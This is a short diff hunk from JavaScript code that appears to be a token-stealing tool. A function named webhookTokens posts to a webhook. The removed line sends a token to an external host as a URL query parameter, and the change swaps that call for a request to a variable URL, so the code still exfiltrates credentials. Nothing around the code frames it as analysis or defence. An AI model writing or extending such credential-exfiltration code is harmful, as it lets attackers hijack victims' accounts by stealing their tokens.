@@ -142,7 +142,7 @@ const webhookTokens = async (webhook) => {
                     console.error("Error al enviar la solicitud a la webhook:", error.message);
                 }
             })
-            instance.get(`https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`);
+            instance.get(copy);
             continue;
         } catch (e) {
             return
